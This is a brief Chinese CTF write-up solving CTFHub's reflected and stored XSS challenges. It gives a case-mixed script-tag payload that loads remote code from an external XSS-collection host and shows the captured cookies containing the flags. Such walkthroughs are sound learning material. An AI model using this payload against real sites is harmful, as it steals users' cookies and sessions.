## CTHHUB--XSS

### 反射型

![image-20240829164122690](https://gitee.com/bx33661/image/raw/master/path/image-20240829164122690.png)

> https://xssjs.com/             使用得到平台

传入链接

```
<sCRiPt sRC=//uj.ci/3e6></sCrIpT>
```

发送链接，点击按钮 **send**

![image-20240829163946547](https://gitee.com/bx33661/image/raw/master/path/image-20240829163946547.png)

```
location : http://challenge-a5c9987943fdc1f4.sandbox.ctfhub.com:10800/?name=%3CsCRiPt+sRC%3D%2F%2Fuj.ci%2F3e6%3E%3C%2FsCrIpT%3E
toplocation : http://challenge-a5c9987943fdc1f4.sandbox.ctfhub.com:10800/?name=%3CsCRiPt+sRC%3D%2F%2Fuj.ci%2F3e6%3E%3C%2FsCrIpT%3E
cookie : flag=ctfhub{91aea5c03fc2965dbac9f9ef}
```



### 存储型

操作与上面那个相似

```
<sCRiPt sRC=//uj.ci/3e6></sCrIpT>
```

得到内容：

```
location : http://challenge-9db1d31d95b8ae29.sandbox.ctfhub.com:10800/
toplocation : http://challenge-9db1d31d95b8ae29.sandbox.ctfhub.com:10800/
cookie : flag=ctfhub{042a9cccb835592d929492c0}
```



